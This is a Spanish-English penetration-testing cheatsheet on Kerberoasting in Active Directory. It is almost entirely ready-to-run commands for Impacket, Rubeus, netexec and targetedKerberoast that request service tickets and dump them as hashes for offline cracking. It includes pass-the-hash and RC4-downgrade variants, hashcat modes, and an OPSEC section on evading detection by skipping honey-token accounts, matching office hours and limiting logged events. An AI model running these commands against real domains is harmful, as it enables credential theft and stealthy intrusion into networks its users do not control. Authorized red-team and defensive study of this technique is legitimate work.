---
aliases:
  - Request TGS
  - Rubeus kerberoast
  - GetUserSPNs
  - TGS Hash Dump
tags:
  - type/cheatsheet
  - technique/credential-access
  - technique/kerberos
  - asset/active-directory
  - cred/kerberos
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[Kerberoasting]]"
---
# Kerberoasting - Request TGS

***

## Impacket GetUserSPNs (Linux)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-GetUserSPNs corp.local/u:p -dc-ip <DC> -request -outputfile hashes.txt` | Bulk roast + save hashes | Standard Linux. |
| `impacket-GetUserSPNs corp.local/u:p -dc-ip <DC>` | Solo enum SPNs (no roast) | Recon-only. |
| `impacket-GetUserSPNs corp.local/u:p -dc-ip <DC> -request -outputfile h.txt -hashes :<NT>` | PtH auth | Sin password. |
| `impacket-GetUserSPNs corp.local/u:p -dc-ip <DC> -request -outputfile h.txt -aesKey <AES256>` | AES auth | OPSEC. |
| `impacket-GetUserSPNs corp.local/u -k -no-pass -dc-ip <DC> -request -outputfile h.txt` | Kerberos auth (con TGT) | OPSEC + post-overpass. |
| `impacket-GetUserSPNs corp.local/u:p -dc-ip <DC> -request -user <single-user>` | Targeted single user | Reduce noise. |
| `impacket-GetUserSPNs corp.local/u:p -dc-ip <DC> -request -outputfile h.txt -usersfile users.txt` | Multiple users from file | Targeted bulk. |
^kerb-tgs-impacket

```bash
# Standard pipeline
impacket-GetUserSPNs corp.local/auditor:'Pass!' -dc-ip 10.10.10.10 -request -outputfile roast.hash

# Output format (hashcat 13100 ready):
# $krb5tgs$23$*svc_sql$corp.local$MSSQLSvc/sqlsrv01.corp.local~1433*$abc123def...
```

___

## Rubeus kerberoast (Windows)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `Rubeus.exe kerberoast /outfile:hashes.txt` | Bulk roast all SPNs | Standard. |
| `Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat` | Hashcat format explícito | Default. |
| `Rubeus.exe kerberoast /user:<svc> /outfile:single.txt` | Targeted (1 user) | Reduce noise. |
| `Rubeus.exe kerberoast /spn:MSSQLSvc/sqlsrv01.corp.local /outfile:sql.txt` | Specific SPN | Edge targeted. |
| `Rubeus.exe kerberoast /outfile:hashes.txt /aes` | Solo AES tickets (skip RC4) | OPSEC + harder crack. |
| `Rubeus.exe kerberoast /outfile:hashes.txt /rc4opsec` | Filter accounts soportando RC4 (downgrade attack viable) | Crack-friendly. |
| `Rubeus.exe kerberoast /outfile:hashes.txt /tgtdeleg` | Force RC4 via TGT delegation | Downgrade (loud). |
| `Rubeus.exe kerberoast /outfile:hashes.txt /domain:partner.com` | Cross-domain | Cross-trust. |
| `Rubeus.exe kerberoast /outfile:hashes.txt /ticket:<TGT-base64>` | Use existing TGT (no creds needed) | Post-PtT. |
^kerb-tgs-rubeus

```cmd
:: Standard targeted
Rubeus.exe kerberoast /user:svc_sql /outfile:svc_sql.hash /format:hashcat

:: Bulk con AES filter
Rubeus.exe kerberoast /aes /outfile:aes_hashes.txt
```

___

## netexec kerberoasting

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc ldap <DC> -u u -p p --kerberoasting roast.hash` | Bulk enum + roast all-in-one | Quick. |
| `nxc ldap <DC> -u u -H <NT> --kerberoasting roast.hash` | PtH auth | Sin password. |
| `nxc ldap <DC> -u u -p p --kerberoasting roast.hash --kdcHost <DC>` | DC explícito | Targeted. |
| `nxc ldap <DC> -u u -p p -k --kerberoasting roast.hash` | Kerberos auth | OPSEC. |
^kerb-tgs-nxc

```bash
nxc ldap <DC> -u user -p pass --kerberoasting roast.hash
# Output: hashcat-ready en file
```

___

## targetedKerberoast.py (Linux)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `python3 targetedKerberoast.py -d corp.local -u u -p pass` | Auto: encuentra users con `WriteProperty` + set SPN + roast + clear | Targeted ACL abuse. |
| `python3 targetedKerberoast.py -d corp.local -u u --no-pass -k` | Kerberos auth | OPSEC. |
| `python3 targetedKerberoast.py -d corp.local -u u -p pass --request-user <victim>` | Specific victim | Targeted. |
^kerb-tgs-targeted

**Cuándo:** atacante tiene `WriteProperty servicePrincipalName` (o `GenericAll/Write`) sobre user sin SPN. Tool automatiza: set SPN → roast → clear SPN. Modern way para bypass cuando service accounts no existen.

```bash
git clone https://github.com/ShutdownRepo/targetedKerberoast
python3 targetedKerberoast/targetedKerberoast.py -d corp.local -u atacante -p 'Pass!'
```

___

## Encryption Type Selection

| **etype** | **Hash format** | **Hashcat mode** | **Crack speed** |
|:---:|:---:|:---:|:---:|
| 23 (RC4-HMAC-MD5) | `$krb5tgs$23$*...` | `13100` | **Fastest** crack. |
| 18 (AES256-CTS-HMAC-SHA1-96) | `$krb5tgs$18$...` | `19700` | Slow crack. |
| 17 (AES128-CTS-HMAC-SHA1-96) | `$krb5tgs$17$...` | `19600` | Slow. |
^kerb-tgs-etype

**Realidad:**
- Modern domains (Win Server 2008+) default AES.
- Account UAC `UseDESKeyOnly` (legacy) o `msDS-SupportedEncryptionTypes` controla.
- Atacante prefiere RC4 (faster crack) → `Rubeus /tgtdeleg` fuerza RC4 (loud).

___

## Targeted vs Bulk Roast

| **Aspecto** | **Bulk roast** | **Targeted (1 user)** |
|:---:|:---:|:---:|
| Comando | `impacket-GetUserSPNs ... -request` (default todos) | `Rubeus kerberoast /user:<svc>` |
| Eventos 4769 | N events (1 per user) | 1 event |
| Detection | Bulk pattern → MDI alert | Single ticket request = baseline noise |
| Speed | Fast | Slow (1 user at a time) |
| OPSEC | Loud | Stealth |
^kerb-tgs-targetedvsbulk

___

## OPSEC Pre-Roast

| **Práctica** | **Detalle** | **Cuándo** |
|:---:|:---:|:---:|
| Filter por SPN class crítico | Solo MSSQLSvc/HTTP/etc → reduce events | Stealth. |
| Skip computer accounts | `(&(objectCategory=user)(servicePrincipalName=*))` excluye computers | Standard. |
| Avoid honey-tokens | Pre-check `Get-ADUser -Filter * \| ? {$_.LogonCount -eq 0 -and $_.ServicePrincipalName}` | Pre-attack. |
| Targeted en vez de bulk | 1 user a la vez con sleep | OPSEC. |
| Time-of-day matching | Match office hours legit auth | Stealth. |
| AES-only filter (`/aes`) si posible | Avoid RC4 etype anomaly | Modern. |
^kerb-tgs-opsec

___

## Common Errors

| **Error** | **Causa** | **Fix** |
|:---:|:---:|:---:|
| `KRB_AP_ERR_SKEW` | Clock skew >5min | NTP sync. |
| `KDC_ERR_S_PRINCIPAL_UNKNOWN` | SPN inexistente | Verify SPN spelling. |
| `KDC has no support for encryption type` | Account no soporta etype requested | Try other etype. |
| Output sin TGS hashes | User sin SPN o auth failed | Validate creds + SPN exists. |
| `KRB_AP_ERR_MODIFIED` post-PtT | TGT corrupted | Re-request TGT. |
^kerb-tgs-errors

***
